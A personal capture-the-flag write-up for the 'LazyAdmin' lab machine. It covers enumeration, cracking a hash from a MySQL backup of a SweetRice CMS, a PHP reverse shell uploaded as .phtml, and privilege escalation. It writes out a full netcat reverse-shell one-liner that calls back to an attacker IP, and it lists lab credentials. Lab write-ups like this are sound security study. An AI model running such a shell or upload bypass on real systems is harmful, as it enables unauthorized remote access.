LazyAdmin 12/12/2024 (This is a personal writeup to be consulted later)  
#Enumeration
We scan with nmap to see open ports and services :  
![image](https://github.com/user-attachments/assets/ea4fdd5b-9f93-4127-9806-dd219dd2dbb3)  
2 open ports , ssh and 80/tcp  

using Gobuster , we find this directory : 
![image](https://github.com/user-attachments/assets/6ff6fa76-dff6-4c5c-b752-487ae314fd6e)  
![image](https://github.com/user-attachments/assets/c608268a-096e-45f1-9a6d-4669bbee4562)  

We know now that the machine is using SweetRice

I will try to use Metasploit , and search for known CVE for SweetRice  
![image](https://github.com/user-attachments/assets/25fcc2f5-fd13-4fd6-8702-11c779e8b129)  

i didn't find anything   

I run Gobuster Again but on http://10.10.90.211/content  , Maybe I find something interesting  
![image](https://github.com/user-attachments/assets/e55f06ac-76a2-493e-b9d1-47ea0e6a3a76)  

![image](https://github.com/user-attachments/assets/ce7efed9-94d6-41cc-8c2c-a91411d7cab7)  
I found this login page .  
I also see mysql BACKUP !!  
![image](https://github.com/user-attachments/assets/5bc58d61-2bc0-4e2d-a081-69cbd2e92299)  
![image](https://github.com/user-attachments/assets/f81283eb-4d8d-4e0a-a1e2-029ada841b45)  

I open the sql file , and i find a password hash , it may be it  
![image](https://github.com/user-attachments/assets/c9a3dfb7-02e7-4d35-ae61-5362e5d39f36)  

I use crackstation.net to crack the md5 hash  
![image](https://github.com/user-attachments/assets/f8c97409-fd92-43e6-9ec9-b6d292dff41b)  
and I found the password !!  

Now I try to login : manager/Password123  
![image](https://github.com/user-attachments/assets/678e57e2-7d42-4072-b722-fabac89d5029)  

then I create a shell file php  
![image](https://github.com/user-attachments/assets/a787cf01-82a3-48e0-90b8-16c64524c6b3)  

the web app doesn't accept php file , so i changed the extension to 'phtml'  
I start now my Listener  
I upload the file in the Media Center page  
![image](https://github.com/user-attachments/assets/53f865a9-b940-4ddd-8cbe-03e4ebc1e70b)  
I click on file ,  
and Here We Go !! we got the reverse shell  
![image](https://github.com/user-attachments/assets/ea216fb9-c503-4fd5-a64e-74fc9e9df4f5)  
![image](https://github.com/user-attachments/assets/a29cb988-8832-40f7-8f85-c68e2ec4f5b0)  
![image](https://github.com/user-attachments/assets/0cd02237-c616-4945-b13e-1968bb400b6d)  
I found these credentials in the mysql_login.txt (rice:randompass)  

for the root  
![image](https://github.com/user-attachments/assets/80b607f7-5fe1-45b5-8a82-ee4a1778c60b)  

![image](https://github.com/user-attachments/assets/8c4c3bd8-f80f-45d2-a24f-0b8dad21e430)  
it looks like a reverse shell  
I will change the ip adress address with address of my machine
"echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.1.246 5554 >/tmp/f" > copy.sh" 

before that i start a listener on my machiine to port 5554 :  
![image](https://github.com/user-attachments/assets/ccd9fd34-0368-4145-86d4-fbd0bced1dd6)  
I got this result after I executed the file copy.sh  
![image](https://github.com/user-attachments/assets/3a4b4400-6806-42a3-8bf9-a5144e41f3d0)  
in the new listener  :   
well it is wrong  
I need to use perl , to into root  
![image](https://github.com/user-attachments/assets/b46f40ca-f178-435f-b1ab-65c7167e9b22)  
![image](https://github.com/user-attachments/assets/b50f632f-4935-411e-b242-de208ecb8c4e)  

![image](https://github.com/user-attachments/assets/f9308ea6-d683-4d98-8abb-935e13193317)  















